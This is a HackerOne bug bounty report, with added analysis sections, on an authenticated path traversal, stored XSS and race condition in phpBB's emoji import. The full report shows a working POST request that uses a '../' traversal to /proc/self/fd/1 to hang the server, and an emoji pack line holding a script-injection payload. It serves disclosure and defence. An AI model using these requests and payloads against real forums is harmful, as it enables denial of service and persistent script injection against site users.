# Authenticated Path Traversal to Stored XSS and Denial-of-Service in phpBB Emoji Import

## Metadata
- **Source:** HackerOne
- **Report:** 2168002 | https://hackerone.com/reports/2168002
- **Submitted:** 2023-09-17
- **Reporter:** shin24
- **Program:** phpBB
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Path Traversal, Stored Cross-Site Scripting (XSS), Denial-of-Service (DoS), Improper Input Validation, Race Condition
- **CVEs:** None
- **Category:** web-api

## Summary
phpBB's emoji import functionality in acp_icons.php fails to sanitize the 'pak' parameter, allowing authenticated attackers to perform path traversal attacks. The vulnerability enables reading arbitrary files to cause DoS via blocking I/O operations, and importing malicious emoji files with unescaped XSS payloads that execute in all user contexts.

## Attack scenario
1. Attacker authenticates as administrator or gains admin access to phpBB installation
2. Attacker crafts POST request to /adm/index.php?i=acp_icons&mode=smilies with malicious 'pak' parameter pointing to /proc/self/fd/X or other blocking file paths
3. Server attempts to read specified file without proper validation, causing TCP connection to hang and request timeout
4. Attacker alternatively uploads file via attachment endpoint, identifies temporary file descriptor in /proc/self/fd/, and uses race condition to trigger emoji import before file deletion
5. Attacker imports malicious emoji file containing XSS payload in SMILEY_IMG field (e.g., '"onmouseover=alert() ><script>alert()</script>')
6. Stored XSS payload executes whenever emoji is rendered across forum (posts, comments, admin section), affecting all users who view the content

## Root cause
The 'pak' parameter is passed directly to PHP's file() function without sanitization or path validation. Additionally, emoji image data (SMILEY_IMG) is not HTML-encoded before storage and output, and file upload race condition allows importing files from temporary file descriptors before cleanup.

## Attacker mindset
An authenticated attacker seeks to maximize damage scope by combining multiple vulnerabilities: using path traversal for reconnaissance and DoS, exploiting race conditions to bypass file access restrictions, and leveraging stored XSS for persistent compromise affecting all forum users.

## Defensive takeaways
- Implement strict path validation using basename() or realpath() with whitelist of allowed directories
- Sanitize all file-based input parameters with canonical path resolution before file operations
- HTML-encode all user-supplied data before storing in database, especially media metadata fields
- Apply output encoding at display time as defense-in-depth (encode emoji image paths and attributes)
- Implement file upload cleanup mechanisms with secure temporary file handling (no readable /proc/self/fd descriptors)
- Restrict emoji import functionality to specific directories with strict permissions
- Add rate limiting on file operations to prevent DoS via blocking I/O
- Use Content Security Policy to mitigate XSS impact
- Implement file integrity verification and signature validation for import packages

## Variant hunting
Check other admin import functions (themes, extensions, language packs) for identical path traversal in 'pak' or similar parameters
Search for unescaped data in other media/asset import workflows that could lead to stored XSS
Identify other PHP file operations that accept user input without canonicalization
Review all temporary file handling in upload mechanisms for race condition vulnerabilities
Check for similar blocking file paths (/proc/self/fd/*, /proc/self/status, /dev/zero) in other contexts

## MITRE ATT&CK
- T1190
- T1083
- T1526
- T1567
- T1499
- T1203
- T1059

## Notes
Report demonstrates sophisticated chaining of three vulnerabilities: path traversal enables both DoS and information disclosure, race condition on temporary files bypasses access controls, and stored XSS achieves persistent compromise. The attacker's method of identifying and exploiting /proc/self/fd file descriptors during uploads is particularly creative. Authentication requirement limits immediate impact but admin compromise is common in real scenarios. Video demonstration shows practical exploitation feasibility despite resource constraints.

## Full report
<details><summary>Expand</summary>

# Denial-of-Service
The vulnerabiity lies on the line `552` of `acp_icons.php`file, when importing emoji from a file we can tell phpBB which file to import from via the paramter `pak`, without any sanitization, the `pak` paramter gets passed dirrectly to `file` the file function, which attemp to read the content of the file to an array.
{F2705838}
Because of the check, reading files like /etc/passwd would not be possible, but if we try to read files like /proc/self/fd/1, the request will hang, a TCP connection will be kept open, the will bring lots of burden to the server. More over, in the case when phpBB is behind a proxy, which may process concurrent request one by one, in this case, if the previous request has not finished, the the rest of requests will have to wait for it to timeout, causing a Denial-of-Service

In the progress of testing, i use the default HTTP server of PHP, which simulate exactly what a one-by-one request processing proxy would do.
Request:
```
POST /adm/index.php?i=acp_icons&mode=smilies&current=delete HTTP/1.1
Host: 127.0.0.1:8082
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Content-Type: application/x-www-form-urlencoded
Referer: http://127.0.0.1:8082/adm/index.php?i=acp_icons&mode=smilies
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: csrftoken=Ky6rB5uThxl3PwYd6EScmT9WXYiH6rGe; sessionid=hmrhwwo5hj5abu4kqgln2let1x9zudbr; phpbb3_83bmg_u=2; phpbb3_83bmg_k=zalvonnyh1lr16og; phpbb3_83bmg_sid=3ba797a8668f6db1639ac6939d91f96e
Connection: close
Content-Length: 137

action=import&pak=../../../../../../../../../proc/self/fd/1&form_token=b2655d5f0c9edb201328b799a61777b26cef16a5&creation_time=1694960302
```
Result timed-out and no response received:
{F2705858}

This vulnerability can also help an authenticated attacker know which file exist on server by observe the response message, if the file is not found, the error from `$user->lang['PAK_FILE_NOT_READABLE']` would trigger and result in different message than `$user->lang['WRONG_PAK_TYPE']`(when the file exist but has invalid format)
# Stored XSS
When testing the emoji import, i also observe that the `SMILEY_IMG` isn't sanitized or escaped
{F2705870} 
So we can import a malicious emoji file containing the XSS payload, everyone who access the sites (posting section, comment section, admin section, ...) that emoji presents will trigger the XSS payload, leading to web defacement, cookie stealing, malware attack, ... 
```
'icon_e_biggrin.gif', '15', '17', '1', 'Very Happy', ':D',
'icon_e_biggrin.gif', '15', '17', '1', 'Very Happy', ':-D',
'icon_e_biggrin.gif', '15', '17', '1', 'Very Happy', ':grin:',
'icon_e_smile.gif', '15', '17', '1', 'Smile', ':)',
'icon_e_smile.gif', '15', '17', '1', 'Smile', ':-)',
'icon_e_smile.gif', '15', '17', '1', 'Smile', ':smile:',
'icon_e_wink.gif', '15', '17', '1', 'Wink', ';)',
'icon_e_wink.gif', '15', '17', '1', 'Wink', ';-)',
'icon_e_wink.gif', '15', '17', '1', 'Wink', ':wink:',
'icon_e_sad.gif', '15', '17', '1', 'Sad', ':(',
'icon_e_sad.gif', '15', '17', '1', 'Sad', ':-(',
'icon_e_sad.gif', '15', '17', '1', 'Sad', ':sad:',
'icon_e_surprised.gif', '15', '17', '1', 'Surprised', ':o',
'icon_e_surprised.gif', '15', '17', '1', 'Surprised', ':-o',
'icon_e_surprised.gif', '15', '17', '1', 'Surprised', ':eek:',
'icon_eek.gif', '15', '17', '1', 'Shocked', ':shock:',
'icon_e_confused.gif', '15', '17', '1', 'Confused', ':?',
'icon_e_confused.gif', '15', '17', '1', 'Confused', ':-?',
'icon_e_confused.gif', '15', '17', '1', 'Confused', ':???:',
'"onmouseover=alert() ><script>alert()</script>', '17', '18', '1', 'POC', ':POC:',
```
The problem is, if the attacker has no file access permission, how would he be able to import emoji from files? In here, i abused the function of PHP that it will create an tmp file in /tmp and has an file descriptor pointing at it (in my case was /proc/self/fd/10) when php process an uploading, then we will spam a lot of upload attachment request and in the same time, use race condition to import the file before it's deleted. Below i record a short video, spaming the upload request and use a small php file which emulate the behavior of the import function for demonstration purpose, i would be quite the same with the real function but if i turn on to many tab for race condition and also the recorder, i laptop will explose...

{F2705889}

The final result:
{F2705893}

## Impact

The impact for both DoS and XSS has been mentioned above

# Mitigation
I suggest HTML entity encoding data from emoji before show to client, limiting the folder of which user can import the emoji from.

</details>

---
*Analysed by Claude on 2026-05-12*
